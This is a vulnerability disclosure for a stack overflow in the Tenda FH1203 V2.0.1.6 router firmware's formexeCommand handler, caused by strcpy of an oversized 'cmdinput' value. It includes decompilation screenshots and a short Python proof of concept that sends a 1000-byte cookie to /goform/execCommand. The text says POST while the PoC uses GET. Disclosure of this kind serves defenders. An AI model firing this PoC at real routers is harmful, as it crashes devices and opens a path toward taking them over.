## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

The Tenda FH1203 V2.0.1.6 firmware has a stack overflow vulnerability in the `formexeCommand` function. The `src` variable receives the `cmdinput` parameter from a POST request and is later assigned to the `v7` variable, which is fixed at 512 bytes. However, since the user can control the input of `cmdinput`, the statement `strcpy(v7, src);` can cause a buffer overflow. The user-provided `cmdinput` can exceed the capacity of the `v7` array, triggering this security vulnerability.

![image-20240319224459247](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224459247.png)

![image-20240319224448337](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224448337.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"cmdinput=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

![image-20240320012159891](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320012159891.png)